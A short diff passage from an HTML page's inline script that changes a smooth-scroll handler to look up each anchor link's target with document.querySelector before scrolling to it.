-      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      const t = document.querySelector(a.getAttribute('href'));
+      if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' });
     });
   });
 </script>
+
 </body>
 </html>
